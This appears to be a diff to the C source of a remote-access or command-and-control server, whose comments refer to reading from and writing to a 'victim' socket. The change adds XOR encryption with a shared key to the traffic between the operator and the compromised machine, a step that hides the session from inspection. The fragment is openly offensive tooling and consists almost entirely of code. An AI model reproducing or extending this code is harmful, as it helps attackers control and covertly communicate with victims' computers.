@@ -6,6 +6,9 @@
 #include <string.h>
 #include <unistd.h>
 
+extern char* key;
+extern int keylen;
+
 int server_control_session(){
     int n;
     char buffer[MAXBUF];
@@ -65,14 +68,14 @@ void *Socket_Reader(){
     // Intercept incoming data from the current victim socket
     char buffer[MAXBUF];
     int n;
-
-    n = read(a.dest, buffer, MAXBUF);
-    write(STDOUT_FILENO, buffer, n);
+    read(a.dest, buffer, 17);
+    char* xorhello = XOR(buffer, key, 17, keylen);
+    write(STDOUT_FILENO, xorhello, 17);
 
     fflush(NULL);
     while (a.kill == 0 && (n = read(a.dest, buffer, MAXBUF)) > 0) {
-
-        if (write(STDOUT_FILENO, buffer, n) < 0)  // writes data from victim fd to stdout
+	char* xorbuffer = XOR(buffer, key, n, keylen);
+        if (write(STDOUT_FILENO, xorbuffer, n) < 0)  // writes data from victim fd to stdout
             printf("Error in function write()\n");
         fflush(NULL);
         //printf("%d>", a.dest);
@@ -96,16 +99,19 @@ void *Socket_Writer()
     int n;
     char buffer[MAXBUF];
 
-    while (a.kill == 0 && (n = read(a.src, buffer, MAXBUF - 1)) > 0) // reads from the stdin file descriptor and executes code if it's contents are above 0. a.src is passed the stdin fd on line 122
+    while (a.kill == 0 && (n = read(a.src, buffer, MAXBUF)) > 0) // reads from the stdin file descriptor and executes code if it's contents are above 0. a.src is passed the stdin fd on line 122
     {
+	
 
         if (strcmp(newline_terminator(buffer), "!exit\n") == 0 || strcmp(newline_terminator(buffer), "!exit\n\n") == 0) { //Find a way
             printf("Exiting session...\n");
             a.kill = 1;
             return NULL;
         } else {
+	
+	    char* xorbuffer = XOR(buffer, key, MAXBUF, keylen);
 
-            write(a.dest, buffer, n); // writes to victim file descriptor. clientfd is passed to a.dest on line 12
+            write(a.dest, xorbuffer, MAXBUF); // writes to victim file descriptor. clientfd is passed to a.dest on line 12
         }
     }
 
